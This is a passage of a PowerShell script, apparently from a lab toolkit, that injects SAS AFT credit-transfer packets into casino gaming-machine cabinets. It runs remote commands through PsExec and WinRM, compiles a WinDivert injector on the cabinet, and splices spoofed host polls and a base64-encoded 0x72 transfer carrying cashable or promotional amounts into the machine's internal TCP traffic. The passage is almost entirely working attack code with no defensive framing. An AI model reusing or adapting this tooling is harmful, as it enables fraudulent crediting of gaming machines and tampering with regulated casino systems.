            $l = @(Get-NetTCPConnection -LocalPort $p -State Listen -ErrorAction SilentlyContinue)
            if ($l.Count -gt 0) { $listen += $p }
        }
        $only400 = $false
        $l400 = @(Get-NetTCPConnection -LocalPort 40000 -State Listen -ErrorAction SilentlyContinue)
        if ($l400.Count -gt 0 -and $est.Count -eq 0 -and $listen.Count -eq 0) { $only400 = $true }
        [pscustomobject]@{ Established = $est; Listening = $listen; Port40000Only = $only400 }
    }

    $remote = $null
    if ($Credential -and (Test-LabWinRmReachable -Computer $Computer)) {
        try {
            if (Get-Command Add-LabTrustedHostIfNeeded -ErrorAction SilentlyContinue) {
                $null = Add-LabTrustedHostIfNeeded -Computer $Computer
            }
            $opt = New-PSSessionOption -OperationTimeout 60000 -OpenTimeout 15000
            $remote = Invoke-Command -ComputerName $Computer -Credential $Credential `
                -Authentication Negotiate -SessionOption $opt `
                -ScriptBlock $probeScript -ArgumentList @(,$ports)
        }
        catch {
            $result.Detail = "WinRM bridge probe failed: $($_.Exception.Message)"
        }
    }

    if (-not $remote) {
        # Fallback: CommCtrl log hints only (no live TCP).
        $bridge = Get-CommCtrlSasBridgeDetail -Computer $Computer
        $result.Port40000Only = [bool]$bridge.Port40000Only
        if ($bridge.Bridge30550 -and ($ports -contains 30550)) {
            $result.Port = 30550
            $result.Detail = 'log hint: 30550 (no live TCP probe)'
            return [pscustomobject]$result
        }
        if ($bridge.Bridge31150 -and ($ports -contains 31150)) {
            $result.Port = 31150
            $result.Detail = 'log hint: 31150 (no live TCP probe)'
            return [pscustomobject]$result
        }
        $result.Detail = if ($result.Detail) { $result.Detail } else { 'no WinRM probe and no bridge port in CommCtrl log' }
        return [pscustomobject]$result
    }

    $result.Established = @($remote.Established)
    $result.Listening = @($remote.Listening)
    $result.Port40000Only = [bool]$remote.Port40000Only
    foreach ($p in $ports) {
        if ($result.Established -contains $p) {
            $result.Port = $p
            $result.Detail = "ESTABLISHED on $p"
            return [pscustomobject]$result
        }
    }
    foreach ($p in $ports) {
        if ($result.Listening -contains $p) {
            $result.Port = $p
            $result.Detail = "LISTEN only on $p (Aurum not connected yet)"
            return [pscustomobject]$result
        }
    }
    if ($result.Port40000Only) {
        $result.Detail = 'Gateway SAS stuck at :40000 (MUX/COM bridge not up - roulette needs COM5 @921600 for :30550)'
    }
    else {
        $result.Detail = "no ESTABLISHED/LISTEN among $($ports -join ',')"
    }
    return [pscustomobject]$result
}

function Write-MuxComPollPrerequisites {
    param(
        [string] $Computer,
        [string] $Port = 'COM4'
    )
    if (-not (Test-CabinetPrefersMuxComPolls -Computer $Computer)) { return }
    if ($VerbosePreference -ne 'Continue') { return }
    Write-Host ''
    Write-Host '=== MUX / COM4 poll prerequisites (.171 / GST19737) ===' -ForegroundColor Cyan
    Write-Host "  Host PC $Port must be the SAS tester cable into the MUX upstream port (not cabinet COM11)." -ForegroundColor DarkGray
    Write-Host '  Physical chain: host COM4 (raw 80/81 @19200) -> MUX -> cabinet COM11 -> CommCtrlSAS.' -ForegroundColor DarkGray
    Write-Host '  Success signal: fresh qGMID1:80/81 lines in cabinet sasmsgr within ~15s of polling.' -ForegroundColor DarkGray
    Write-Host '  Loopback WinDivert pollaft alone is insufficient on .171 (EGM stays offline).' -ForegroundColor Yellow
    Write-Host '  See aft/investigations/171-landing-plan.md and poll-source.md' -ForegroundColor DarkGray
    Write-Host ''
}

function Format-SasComProbeFailure {
    param([string] $Message, [string] $Port = 'COM4')
    $msg = ($Message -as [string]).Trim()
    if ($msg -match 'in use|SASTest|IGT|busy|Access is denied|could not open|PermissionError') {
        return @{
            Category = 'port_busy'
            Hint     = "Close the IGT SAS tester (or any app holding $Port), wait a few seconds, then retry. You can also leave the IGT tester running and skip the built-in keeper with -NoAutoSasPoll."
        }
    }
    if ($msg -match 'FileNotFound|cannot find|does not exist|no such file') {
        return @{
            Category = 'port_missing'
            Hint     = "Windows does not see $Port. Check the USB serial cable, driver, and Device Manager COM port assignment."
        }
    }
    return @{
        Category = 'probe_failed'
        Hint     = "Verify $Port is the MUX host cable and pyserial is installed (pip install pyserial)."
    }
}

function Resolve-SasPollKeeperScript {
    # Prefer repo sas_poll_keeper.py (blocker detection + shared wire helpers) over standalone.
    $candidates = @(
        (Join-Path (Split-Path $PSScriptRoot -Parent) 'scripts\sas_poll_keeper.py'),
        (Join-Path (Split-Path $PSScriptRoot -Parent) 'scripts\sas_poll_keeper_standalone.py')
    )
    $repoRoot = Split-Path $PSScriptRoot -Parent
    if ($repoRoot) {
        $candidates += Join-Path $repoRoot 'GoldclubLogInvestigator\scripts\sas_poll_keeper.py'
        $candidates += Join-Path $repoRoot 'GoldclubLogInvestigator\scripts\sas_poll_keeper_standalone.py'
    }
    foreach ($path in $candidates) {
        if ($path -and (Test-Path -LiteralPath $path)) {
            return $path
        }
    }
    return $null
}

function Test-SasComPortAvailable {
    param([string] $Port = 'COM4')
    $keeper = Resolve-SasPollKeeperScript
    if (-not $keeper) {
        return @{ Ok = $false; Message = "Missing SAS poll keeper script under $(Split-Path $PSScriptRoot -Parent)\scripts (expected sas_poll_keeper_standalone.py)" }
    }
    $py = Get-Command python -ErrorAction SilentlyContinue
    if (-not $py) {
        return @{ Ok = $false; Message = 'python not found on PATH (needed for COM poll probe)' }
    }
    $probe = & $py.Source $keeper '--probe' $Port 2>&1 | Out-String
    $probe = $probe.Trim()
    $ok = ($LASTEXITCODE -eq 0)
    return @{ Ok = $ok; Message = $(if ($probe) { $probe } else { "COM probe exit $LASTEXITCODE" }) }
}

function Start-SasPollKeeper {
    param(
        [string] $Port = 'COM4',
        [int]    $WarmupSec = 4
    )
    $keeper = Resolve-SasPollKeeperScript
    if (-not $keeper) {
        throw "Missing SAS poll keeper script under $(Split-Path $PSScriptRoot -Parent)\scripts"
    }
    $py = Get-Command python -ErrorAction SilentlyContinue
    if (-not $py) {
        throw 'python not found on PATH (needed for SAS poll keeper)'
    }
    $warmupMs = [math]::Max(0, $WarmupSec * 1000)
    $args = @(
        $keeper,
        $Port,
        '--interval-ms', '200',
        '--warmup-s', ([string]([math]::Max(0.5, $WarmupSec)))
    )
    $repoRoot = Split-Path $PSScriptRoot -Parent
    $proc = Start-Process -FilePath $py.Source -ArgumentList $args `
        -WorkingDirectory $repoRoot -WindowStyle Hidden -PassThru
    Start-Sleep -Milliseconds ([math]::Min(1500, $warmupMs))
    return $proc
}

function Stop-SasPollKeeper {
    param([System.Diagnostics.Process] $Process)
    if ($null -eq $Process) { return }
    if ($Process.HasExited) { return }
    try {
        Stop-Process -Id $Process.Id -Force -ErrorAction Stop
    }
    catch {
        Write-Host "[!] Could not stop SAS poll keeper (pid $($Process.Id)): $_" -ForegroundColor Yellow
    }
}

function Wait-CabinetSasPolls {
    param(
        [string] $Computer,
        [int]    $TimeoutSec = 15,
        [int]    $WithinSeconds = 8
    )
    $deadline = (Get-Date).AddSeconds([math]::Max(1, $TimeoutSec))
    do {
        if (Test-CabinetSasPollsRecent -Computer $Computer -WithinSeconds $WithinSeconds) {
            return $true
        }
        Start-Sleep -Milliseconds 400
    } while ((Get-Date) -lt $deadline)
    return $false
}

function Start-AutoSasPollKeeperIfNeeded {
    param(
        [string] $Computer,
        [string] $Port = 'COM4',
        [int]    $WarmupSec = 4,
        [int]    $PollWaitSec = 15,
        [int]    $StaleWakeMin = 5,
        [switch] $NoAutoWake
    )
    if (Test-CabinetSasPollsRecent -Computer $Computer -WithinSeconds 12) {
        Write-Host '[+] SAS general polls already active on cabinet (external host or prior session).' -ForegroundColor Green
        return @{ Ok = $true; Process = $null; Message = 'Cabinet polls already active' }
    }

    $autoWakeAttempted = $false
    $autoWakeFailed = $false
    if (-not $NoAutoWake -and -not $script:PollAutoWakeAttempted) {
        $psExecTimeout = if ($Computer -eq '10.0.0.171') { 120 } else { 90 }
        $wakeResult = Invoke-CabinetSasPollAutoWakeIfNeeded -Computer $Computer -Credential $Credential `
            -PsExecPath $PsExecPath -PsExecAuthArgs $script:PsExecAuthArgs -StaleWakeMin $StaleWakeMin `
            -PsExecTimeoutSec $psExecTimeout
        if ($wakeResult.Attempted) {
            $script:PollAutoWakeAttempted = $true
            $autoWakeAttempted = $true
            $autoWakeFailed = -not $wakeResult.ServicesUp
            if (Wait-CabinetSasPolls -Computer $Computer -TimeoutSec $PollWaitSec) {
                Write-Host '[+] Cabinet sasmsgr shows live 80/81 polls after SAS bridge wake.' -ForegroundColor Green
                return @{
                    Ok        = $true
                    Process   = $null
                    Message   = 'Polls active after SAS bridge wake'
                    AutoWakeAttempted = $true
                }
            }
        }
    }

    Write-Host '[*] No recent cabinet 80/81 polls  -  checking whether host COM port is free...' -ForegroundColor Cyan
    $probe = Test-SasComPortAvailable -Port $Port
    if (-not $probe.Ok) {
        $diag = Get-CabinetSasPollFailureDiagnosis -Computer $Computer -Credential $Credential `
            -PsExecPath $PsExecPath -PsExecAuthArgs $script:PsExecAuthArgs -Port $Port `
            -ComProbeResult @{ Ok = $false; Message = $probe.Message } `
            -AutoWakeAttempted:$autoWakeAttempted -AutoWakeFailed:$autoWakeFailed
        return @{
            Ok        = $false
            Process   = $null
            Message   = $diag.PrimaryReason
            Diagnosis = $diag
            AutoWakeAttempted = $autoWakeAttempted
            AutoWakeFailed    = $autoWakeFailed
        }
    }
    Write-Host "[+] $($probe.Message)" -ForegroundColor Green
    Write-Host "[*] Starting built-in SAS poll keeper on $Port (IGT-tester-style 80/81 @200ms)..." -ForegroundColor Cyan
    try {
        $proc = Start-SasPollKeeper -Port $Port -WarmupSec $WarmupSec
    }
    catch {
        return @{ Ok = $false; Process = $null; Message = "Could not start SAS poll keeper: $_" }
    }
    if (Wait-CabinetSasPolls -Computer $Computer -TimeoutSec $PollWaitSec) {
        Write-Host '[+] Cabinet sasmsgr shows live 80/81 polls  -  safe to inject.' -ForegroundColor Green
        return @{ Ok = $true; Process = $proc; Message = 'Poll keeper active' }
    }
    $diag = Get-CabinetSasPollFailureDiagnosis -Computer $Computer -Credential $Credential `
        -PsExecPath $PsExecPath -PsExecAuthArgs $script:PsExecAuthArgs -Port $Port `
        -ComProbeResult @{ Ok = $true; Message = $probe.Message } -PollKeeperStarted `
        -PollWaitSec $PollWaitSec `
        -AutoWakeAttempted:$autoWakeAttempted -AutoWakeFailed:$autoWakeFailed
    return @{
        Ok        = $false
        Process   = $proc
        Message   = $diag.PrimaryReason
        Diagnosis = $diag
        AutoWakeAttempted = $autoWakeAttempted
        AutoWakeFailed    = $autoWakeFailed
    }
}

function Resolve-SasPollStrategy {
    param(
        [string] $Computer,
        [string] $Mode
    )
    if ($Mode -eq 'None') {
        return @{
            PollsActive  = (Test-CabinetSasPollsRecent -Computer $Computer -WithinSeconds 12)
            UsePollAft   = $false
            UseComKeeper = $false
        }
    }
    $pollsActive = Test-CabinetSasPollsRecent -Computer $Computer -WithinSeconds 12
    # Proven path (txn 83/84): always use pollaft for WinDivert so post-AFT 80/81 continue.
    # Organic/live polls alone + WdInject often yields ingest-without-credit.
    if ($Mode -eq 'WinDivert') {
        return @{
            PollsActive  = $pollsActive
            UsePollAft   = $true
            UseComKeeper = $false
            Message      = if ($pollsActive) {
                'Organic/tester polls active - pollaft still used for post-AFT 80/81 (tester on OK)'
            } else {
                'WinDivert pollaft (simulate 80/81 + AFT; tester off OK)'
            }
        }
    }
    if ($pollsActive) {
        return @{
            PollsActive  = $true
            UsePollAft   = $false
            UseComKeeper = $false
            Message      = 'Cabinet polls already active'
        }
    }
    switch ($Mode) {
        'Com' {
            return @{ PollsActive = $false; UsePollAft = $false; UseComKeeper = $true }
        }
        default {
            return @{ PollsActive = $false; UsePollAft = $true; UseComKeeper = $true }
        }
    }
}

function Test-SasBridgePollAftFailed {
    param([string] $Output)
    if ([string]::IsNullOrWhiteSpace($Output)) { return $true }
    if ($Output -match 'NO_ESTABLISHED|NO_TCP_TRAFFIC') { return $true }
    if ($Output -match 'DONE mode=pollaft.*\baftInjected=False\b') { return $true }
    if ($Output -match 'DONE mode=pollaft.*\bs2c=0\b.*\bc2s=0\b') { return $true }
    if ($Output -match 'finished without AFT_INJECTED') { return $true }
    return $false
}

function Invoke-SasBridgeAutoWake {
    param(
        [string]       $Computer,
        [pscredential] $Credential,
        [switch]       $ClearPendingAft,
        [string]       $PsExecPath = 'C:\Tools\PSTools\PsExec.exe'
    )
    $wakeScript = Join-Path $PSScriptRoot 'Invoke-WakeSasBridge.ps1'
    if (-not (Test-Path -LiteralPath $wakeScript)) {
        throw "Missing $wakeScript (needed for AutoWake on cabinets without WinRM-by-IP, e.g. 10.0.0.171)"
    }
    $wakeArgs = @{
        ComputerName = $Computer
        WaitForWat   = $true
        WaitSec      = 90
        PsExecPath   = $PsExecPath
    }
    if ($Credential) { $wakeArgs.Credential = $Credential }
    if ($ClearPendingAft) { $wakeArgs.ClearPendingAft = $true }

    & $wakeScript @wakeArgs

    $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
    if (-not (Test-Path -LiteralPath $logPath)) { return $false }
    $tail = Get-Content -LiteralPath $logPath -Tail 40 -ErrorAction SilentlyContinue
    return [bool]($tail -match 'WAT2AFT UP')
}

function Invoke-CabinetInjectRemediationLoop {
    <#
    Detect -> fix -> re-check cycles for poll prerequisites before inject abort.
    Returns PollsReady, PollKeeperProc, CycleLog, LastDiagnosis.
    #>
    param(
        [string]         $Computer,
        [pscredential]   $Credential,
        [int]            $MaxCycles = 4,
        [int]            $PollWaitSec = 30,
        [int]            $StaleWakeMin = 5,
        [string]         $SasComPort = 'COM4',
        [int]            $SasPollWarmupSec = 4,
        [string]         $SasPollModeEffective = 'Com',
        [hashtable]      $PollStrategy,
        [switch]         $NoAutoWake,
        [switch]         $NoAutoBootstrap,
        [string]         $PsExecPath = 'C:\Tools\PSTools\PsExec.exe',
        [Nullable[datetime]] $PollCutoffUtc = $null
    )

    $cycleLog = New-Object System.Collections.Generic.List[object]
    $lastDiag = $null
    $pollKeeperProc = $null
    $pollsReady = $false
    $usePollAft = $false

    if ($SasPollModeEffective -eq 'None') {
        return [pscustomobject]@{
            PollsReady     = $false
            PollKeeperProc = $null
            UsePollAft     = $false
            CycleLog       = $cycleLog
            LastDiagnosis  = $null
        }
    }

    # Explicit WinDivert pollaft (proven): even when organic 80/81 already flow, keep pollaft
    # so post-AFT polls continue after 0x72 (WdInject-only often stops polls -> no credit).
    if ($SasPollModeEffective -eq 'WinDivert' -and $PollStrategy.UsePollAft) {
        $usePollAft = $true
        $cycleLog.Add([pscustomobject]@{ Cycle = 0; Summary = 'WinDivert pollaft (no COM keeper)'; Steps = @('poll path: WdPollInject.exe pollaft on inject') }) | Out-Null
        return [pscustomobject]@{
            PollsReady     = $true
            PollKeeperProc = $null
            UsePollAft     = $true
            CycleLog       = $cycleLog
            LastDiagnosis  = $null
        }
    }

    if ($PollStrategy.PollsActive -or (Test-CabinetSasPollsRecent -Computer $Computer -SinceUtc $PollCutoffUtc -WithinSeconds 12)) {
        return [pscustomobject]@{
            PollsReady     = $true
            PollKeeperProc = $null
            UsePollAft     = $false
            CycleLog       = $cycleLog
            LastDiagnosis  = $null
        }
    }


    for ($cycle = 1; $cycle -le $MaxCycles; $cycle++) {
        $steps = New-Object System.Collections.Generic.List[string]
        Write-Host ''
        Write-Host ('=' * 72) -ForegroundColor Cyan
        Write-Host "[*] Remediation cycle $cycle of $MaxCycles for $Computer" -ForegroundColor Cyan
        Write-Host ('=' * 72) -ForegroundColor Cyan

        $script:PollAutoWakeAttempted = $false
        $wakeResult = $null

        if ($cycle -gt 1) {
            if ($script:InjectBootstrapReport -and $script:InjectBootstrapReport.PsExecOk) {
                foreach ($step in $script:InjectBootstrapReport.Steps) {
                    $steps.Add("bootstrap: $step") | Out-Null
                }
                $steps.Add('PsExec health: OK (reused from cycle 1)') | Out-Null
            }
            else {
                $bootstrap = Initialize-CabinetInjectPrerequisites -Computer $Computer -Credential $Credential `
                    -PsExecPath $PsExecPath -PsExecAuthArgs $script:PsExecAuthArgs -NoAutoBootstrap:$NoAutoBootstrap
                $script:PsExecAuthArgs = @($bootstrap.AuthArgs)
                $script:InjectBootstrapReport = $bootstrap
                foreach ($step in $bootstrap.Steps) {
                    $steps.Add("bootstrap: $step") | Out-Null
                }
                if ($bootstrap.PsExecOk) {
                    $steps.Add('PsExec health: OK') | Out-Null
                }
                else {
                    $steps.Add('PsExec health: inconclusive (SMB/wake fallback)') | Out-Null
                }
            }
        }
        elseif ($script:InjectBootstrapReport) {
            foreach ($step in $script:InjectBootstrapReport.Steps) {
                $steps.Add("bootstrap: $step") | Out-Null
            }
            if ($script:InjectBootstrapReport.PsExecOk) {
                $steps.Add('PsExec health: OK (cycle 1 reuse)') | Out-Null
            }
            else {
                $steps.Add('PsExec health: inconclusive (cycle 1 reuse)') | Out-Null
            }
        }

        if (Test-CabinetSasPollsRecent -Computer $Computer -SinceUtc $PollCutoffUtc -WithinSeconds 12) {
            $steps.Add('polls: fresh 80/81 already in sasmsgr') | Out-Null
            $pollsReady = $true
            $cycleLog.Add([pscustomobject]@{ Cycle = $cycle; Summary = 'polls ready'; Steps = $steps }) | Out-Null
            break
        }

        if (-not $NoAutoWake) {
            $psExecTimeout = if ($Computer -eq '10.0.0.171') { 180 } else { 90 }
            $wakeResult = Invoke-CabinetSasPollAutoWakeIfNeeded -Computer $Computer -Credential $Credential `
                -PsExecPath $PsExecPath -PsExecAuthArgs $script:PsExecAuthArgs -StaleWakeMin $StaleWakeMin `
                -PsExecTimeoutSec $psExecTimeout
            if ($wakeResult.Attempted) {
                $script:PollAutoWakeAttempted = $true
                $wakeSummary = if ($wakeResult.StaleWake) { 'stale sasmsgr wake' } else { 'services-down wake' }
                $steps.Add("wake: Invoke-WakeSasBridge ($wakeSummary, ok=$($wakeResult.WakeOk))") | Out-Null
                if (Wait-CabinetSasPolls -Computer $Computer -TimeoutSec $PollWaitSec) {
                    $steps.Add("polls: live 80/81 after wake (${PollWaitSec}s wait)") | Out-Null
                    $pollsReady = $true
                    $cycleLog.Add([pscustomobject]@{ Cycle = $cycle; Summary = 'polls after wake'; Steps = $steps }) | Out-Null
                    break
                }
            }
            else {
                $steps.Add('wake: not needed (services up, sasmsgr not stale)') | Out-Null
            }
        }

        $wantComKeeper = $PollStrategy.UseComKeeper -or (
            $PollStrategy.UsePollAft -and $SasPollModeEffective -eq 'Auto'
        )
        $pollResult = $null
        if ($wantComKeeper) {
            Write-Host "[*] Cycle $cycle : COM/MUX poll keeper on $SasComPort (wait ${PollWaitSec}s for 80/81)..." -ForegroundColor Cyan
            if ($pollKeeperProc) {
                Stop-SasPollKeeper -Process $pollKeeperProc
                $pollKeeperProc = $null
            }
            $pollResult = Start-AutoSasPollKeeperIfNeeded -Computer $Computer -Port $SasComPort `
                -WarmupSec $SasPollWarmupSec -PollWaitSec $PollWaitSec -StaleWakeMin $StaleWakeMin -NoAutoWake:$NoAutoWake
            $pollKeeperProc = $pollResult.Process
            if ($pollResult.Ok) {
                $steps.Add('poll keeper: live 80/81 in sasmsgr') | Out-Null
                $pollsReady = $true
                $cycleLog.Add([pscustomobject]@{ Cycle = $cycle; Summary = 'poll keeper success'; Steps = $steps }) | Out-Null
                break
            }
            $steps.Add("poll keeper: no fresh 80/81 ($($pollResult.Message))") | Out-Null
            $lastDiag = if ($pollResult.Diagnosis) { $pollResult.Diagnosis } else { $null }
        }

        if ((-not $pollsReady) -and $PollStrategy.UsePollAft -and ((-not (Test-CabinetPrefersMuxComPolls -Computer $Computer)) -or ($SasPollModeEffective -eq 'WinDivert'))) {
            $usePollAft = $true
            $steps.Add('poll path: will use WinDivert TCP poll sim on inject') | Out-Null
            $pollsReady = $true
            $cycleLog.Add([pscustomobject]@{ Cycle = $cycle; Summary = 'WinDivert poll sim fallback'; Steps = $steps }) | Out-Null
            break
        }

        if (-not $lastDiag) {
            $lastDiag = Get-CabinetSasPollFailureDiagnosis -Computer $Computer -Credential $Credential `
                -PsExecPath $PsExecPath -PsExecAuthArgs $script:PsExecAuthArgs -Port $SasComPort `
                -ComProbeResult $(if ($pollResult) { @{ Ok = $true; Message = $pollResult.Message } } else { $null }) `
                -PollKeeperStarted:([bool]$pollKeeperProc) -PollWaitSec $PollWaitSec `
                -AutoWakeAttempted:([bool]($wakeResult -and $wakeResult.Attempted)) `
                -AutoWakeFailed:([bool]($wakeResult -and $wakeResult.Attempted -and -not $wakeResult.ServicesUp))
        }

        $summary = if ($lastDiag) { $lastDiag.Category } else { 'polls missing' }
        $cycleLog.Add([pscustomobject]@{ Cycle = $cycle; Summary = $summary; Steps = $steps; Diagnosis = $lastDiag }) | Out-Null

        if ($cycle -lt $MaxCycles) {
            $backoff = [math]::Min(20, 5 * $cycle)
            Write-Host "[*] Cycle $cycle incomplete ($summary); waiting ${backoff}s before cycle $($cycle + 1)..." -ForegroundColor Yellow
            Start-Sleep -Seconds $backoff
        }
    }

    return [pscustomobject]@{
        PollsReady     = $pollsReady
        PollKeeperProc = $pollKeeperProc
        UsePollAft     = $usePollAft
        CycleLog       = $cycleLog
        LastDiagnosis  = $lastDiag
    }
}

function Test-WdPollInjectOpenOk {
    param([string] $Output)
    return [bool]($Output -match '(?m)OPEN ok\s*$')
}

function Test-WdPollAftInjected {
    param([string] $Output)
    return [bool]($Output -match 'AFT_INJECTED')
}

function New-WinDivertPollAftRemoteScript {
    param(
        [string] $RemoteRunPath,
        [string] $BridgePayloadHex,
        [int]    $BridgePort,
        [int]    $RunSeconds,
        [int]    $IntervalMs,
        [int]    $DrainSec,
        [int]    $InjectDelayMs,
        [int]    $EphemWaitSec = 90
    )
    $remoteTemplate = @'
$ErrorActionPreference = "Stop"
$wd  = "__REMOTE_WD__"
$csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
$exe = "$wd\WdPollInject.exe"
$out = "$wd\pollaft_out.txt"
Remove-Item $out -Force -ErrorAction SilentlyContinue
"REMOTE_START $(Get-Date -Format o)" | Out-File -FilePath $out -Encoding utf8
try {
    if (-not (Test-Path $exe)) {
        & $csc /nologo /platform:x64 /optimize+ /out:"$exe" "$wd\WdPollInject.cs" 2>&1 | Out-File -FilePath $out -Encoding utf8 -Append
    }
    if (-not (Test-Path $exe)) {
        "COMPILE_FAILED" | Out-File -FilePath $out -Encoding utf8 -Append
    } else {
        $ephem = 0
        $deadline = (Get-Date).AddSeconds(__EPHEMWAIT__)
        do {
            $c = Get-NetTCPConnection -LocalPort __PORT__ -State Established -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($c) { $ephem = [int]$c.RemotePort; break }
            Start-Sleep -Milliseconds 500
        } while ((Get-Date) -lt $deadline)
        if ($ephem -eq 0) {
            "BRIDGE_STATE (no Established on __PORT__):" | Out-File -FilePath $out -Encoding utf8 -Append
            "PROCESSES:" | Out-File -FilePath $out -Encoding utf8 -Append
            Get-Process CommCtrlSAS,GoldClub.Aurum.Services -ErrorAction SilentlyContinue |
                Select-Object Name, Id | Format-Table -AutoSize | Out-String |
                Out-File -FilePath $out -Encoding utf8 -Append
            "TCP_ALL_STATES:" | Out-File -FilePath $out -Encoding utf8 -Append
            Get-NetTCPConnection -LocalPort __PORT__ -ErrorAction SilentlyContinue |
                Select-Object LocalPort, RemotePort, State, OwningProcess |
                Format-Table -AutoSize | Out-String | Out-File -FilePath $out -Encoding utf8 -Append
            "NO_ESTABLISHED___PORT__ (waited __EPHEMWAIT__s for Aurum TCP client on loopback __PORT__; WdPollInject simulates 1B80/1B81 host polls into this flow - it cannot start without an Established CommCtrlSAS->Aurum connection)" | Out-File -FilePath $out -Encoding utf8 -Append
        } else {
            "DISCOVERED_EPHEM=$ephem" | Out-File -FilePath $out -Encoding utf8 -Append
            $prevEap = $ErrorActionPreference
            $ErrorActionPreference = "Continue"
            try {
                & "$exe" pollaft $ephem __SECONDS__ __INTERVAL__ __DRAIN__ "1B81,1B80" __PORT__ "__PAYLOAD__" __INJECTDELAY__ 2>&1 | Out-File -FilePath $out -Encoding utf8 -Append
                "EXITCODE=$LASTEXITCODE" | Out-File -FilePath $out -Encoding utf8 -Append
            }
            finally { $ErrorActionPreference = $prevEap }
        }
    }
}
catch {
    "REMOTE_EXCEPTION: $_" | Out-File -FilePath $out -Encoding utf8 -Append
}
'@
    return $remoteTemplate.
        Replace('__REMOTE_WD__', $RemoteRunPath).
        Replace('__PAYLOAD__', $BridgePayloadHex).
        Replace('__PORT__', [string]$BridgePort).
        Replace('__SECONDS__', [string]$RunSeconds).
        Replace('__INTERVAL__', [string]$IntervalMs).
        Replace('__DRAIN__', [string]$DrainSec).
        Replace('__INJECTDELAY__', [string]$InjectDelayMs).
        Replace('__EPHEMWAIT__', [string]$EphemWaitSec)
}

function Build-AftInjectEncodedPayloads {
    param(
        [int]    $TxnNumber,
        [byte]   $SasAddress,
        [int64]  $CashableAmount,
        [int64]  $RestrictedAmount,
        [int64]  $NonRestrictedAmount,
        [int]    $AssetNumber,
        [string] $RemoteTemplate,
        [string] $RemoteRunPath,
        [string] $RemotePollRunPath,
        [int]    $BridgePort,
        [int]    $ObserveMs,
        [int]    $AckGraceMs,
        [int]    $WinDivertPollSeconds,
        [int]    $WinDivertPollIntervalMs,
        [int]    $WinDivertPollDrainSec,
        [int]    $WinDivertPollInjectDelayMs,
        [int]    $WinDivertEphemWaitSec
    )
    $pkt = New-AftTransferPacket -Address $SasAddress -CashableAmount $CashableAmount -RestrictedAmount $RestrictedAmount `
        -NonRestrictedAmount $NonRestrictedAmount -Asset $AssetNumber -TxnNumber $TxnNumber
    $bridge = New-Object byte[] ($pkt.Length + 1)
    $bridge[0] = 0x1B
    [Array]::Copy($pkt, 0, $bridge, 1, $pkt.Length)
    $pktHex = ConvertTo-Hex $pkt
    $bridgeHex = ConvertTo-Hex $bridge
    $remoteScript = $RemoteTemplate.Replace('__PAYLOAD__', $bridgeHex).Replace('__PORT__', [string]$BridgePort).Replace('__OBSERVE__', [string]$ObserveMs).Replace('__ACKGRACE__', [string]$AckGraceMs).Replace('__REMOTE_WD__', $RemoteRunPath)
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($remoteScript))
    $pollAftScript = New-WinDivertPollAftRemoteScript -RemoteRunPath $RemotePollRunPath -BridgePayloadHex $bridgeHex `
        -BridgePort $BridgePort -RunSeconds $WinDivertPollSeconds -IntervalMs $WinDivertPollIntervalMs `
        -DrainSec $WinDivertPollDrainSec -InjectDelayMs $WinDivertPollInjectDelayMs -EphemWaitSec $WinDivertEphemWaitSec
    $encPollAft = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($pollAftScript))
    return @{
        SasPacketHex     = $pktHex
        BridgePayloadHex = $bridgeHex
        Enc              = $enc
        EncPollAft       = $encPollAft
    }
}

function Bump-AftTransactionAfterDuplicate {
    param(
        [ref]      $TransactionNumber,
        [string]   $Computer,
        [hashtable] $AutoState,
        [string]   $AutoStatePath,
        [ref]      $AutoNext
    )
    $resolved = Resolve-NextFreeAftTransactionNumber -Computer $Computer -AfterNumber $TransactionNumber.Value
    $newTxn = $resolved.Number
    if ($resolved.Skipped.Count -gt 0) {
        Write-Host ("[*] Auto-bump skipped burned txn id(s) for {0}: {1}" -f $Computer, ($resolved.Skipped -join ', ')) -ForegroundColor DarkGray
    }
    $TransactionNumber.Value = $newTxn
    $nextStored = Get-NextAftTransactionNumber -Current $newTxn
    if ($AutoStatePath) {
        Save-AutoAftTransactionState -State $AutoState -Path $AutoStatePath -Computer $Computer -NextNumber $nextStored
        $AutoNext.Value = $nextStored
    }
    return $newTxn
}

# ---- remote transport (WinRM preferred / PsExec fallback via LabRemoteTransport.ps1) ----

# ---- normalize amount ----
# -Amount is a raw integer in the EGM's base units ("credits"), placed directly
# into the SAS 0x72 non-restricted (promo) field -- same unit as -AmountCents.
# -Amount takes precedence when supplied; otherwise -AmountCents is used as before.
if ($Amount -gt 0) { $AmountCents = $Amount }
if ($AmountCents -le 0 -or $AmountCents -gt 9999999999) {
    throw "Amount out of range (1..9999999999): $AmountCents"
}

# ---- resolve transfer type (exactly one of -c / -r / -nr; default non-restricted) ----
$typeCount = [int][bool]$Cashable + [int][bool]$Restricted + [int][bool]$NonRestricted
if ($typeCount -gt 1) {
    throw "Specify only one transfer type (-c, -r, or -nr)"
}
if ($Cashable)        { $TransferType = 'cashable' }
elseif ($Restricted)  { $TransferType = 'restricted' }
else                  { $TransferType = 'non-restricted' }

$cashableAmt = 0
$restrictedAmt = 0
$nonRestrictedAmt = 0
switch ($TransferType) {
    'cashable'       { $cashableAmt = $AmountCents }
    'restricted'     { $restrictedAmt = $AmountCents }
    'non-restricted' { $nonRestrictedAmt = $AmountCents }
}

# ---- resolve cabinet profile + ClientsSet channel (addr / WakeUpPort) BEFORE building 0x72 ----
$resolvedProfile = Resolve-CabinetProfile -Computer $ComputerName -Requested $CabinetProfile
$clientsSet = Get-ClientsSetSasChannel -Computer $ComputerName
if ($clientsSet.Ok) {
    Write-Host "[*] ClientsSet: $($clientsSet.Detail)" -ForegroundColor DarkGray
    if (-not $PSBoundParameters.ContainsKey('SasAddress')) {
        $SasAddress = [byte]$clientsSet.SasAddress
        Write-Host "[+] SasAddress=$SasAddress (from ClientsSet.xml)" -ForegroundColor Green
    }
    elseif ([int]$SasAddress -ne [int]$clientsSet.SasAddress) {
        Write-Host "[!] SasAddress=$SasAddress differs from ClientsSet SASAddress=$($clientsSet.SasAddress) - inject may TX-only on wrong channel." -ForegroundColor Yellow
    }
}
else {
    Write-Host "[*] ClientsSet: $($clientsSet.Detail) - using SasAddress=$SasAddress" -ForegroundColor DarkGray
}

